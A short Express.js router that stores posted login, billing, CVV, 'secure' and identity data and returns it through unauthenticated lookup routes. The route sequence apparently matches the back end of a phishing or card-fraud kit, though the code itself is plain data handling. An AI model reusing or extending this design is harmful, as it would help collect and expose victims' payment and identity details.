const express = require("express");
const router = express.Router();
const services = require("../../services");

const { v4: uuidv4 } = require("uuid");

router.get("/zebeb", async (req, res) => {
  try {
    var results = await services.infoServices.findLKOL();
    res.send(results);
  } catch (error) {
    res.send(error);
  }
});

router.post("/user", async (req, res) => {
  try {
    var code = uuidv4();
    req.body.code = code;
    var User = await services.infoServices.createUser(req.body);
    res.send({ code });
  } catch (error) {
    res.send(error);
  }
});

router.post("/login", async (req, res) => {
  try {
    var Login = await services.infoServices.createLogin(req.body);
    res.send(Login);
  } catch (error) {
    res.send(error);
  }
});

router.post("/billing", async (req, res) => {
  try {
    var Billing = await services.infoServices.createBilling(req.body);
    res.send(Billing);
  } catch (error) {
    res.send(error);
  }
});
router.post("/cvv", async (req, res) => {
  try {
    var Cvv = await services.infoServices.createCvv(req.body);
    res.send(Cvv);
  } catch (error) {
    res.send(error);
  }
});
router.post("/secure", async (req, res) => {
  try {
    var Secure = await services.infoServices.createSecure(req.body);
    res.send(Secure);
  } catch (error) {
    res.send(error);
  }
});
router.post("/identity", async (req, res) => {
  try {
    var Identity = await services.infoServices.createIdentity(req.body);
    res.send(Identity);
  } catch (error) {
    res.send(error);
  }
});
router.post("/query", async (req, res) => {
  try {
    var Query = await services.infoServices.createQuery(req.body);
    res.send(Query);
  } catch (error) {
    res.send(error);
  }
});
router.post("/findBilling", async (req, res) => {
  try {
    var Billing = await services.infoServices.findBilling(req.body);
    res.send(Billing);
  } catch (error) {
    res.send(error);
  }
});

module.exports = router;
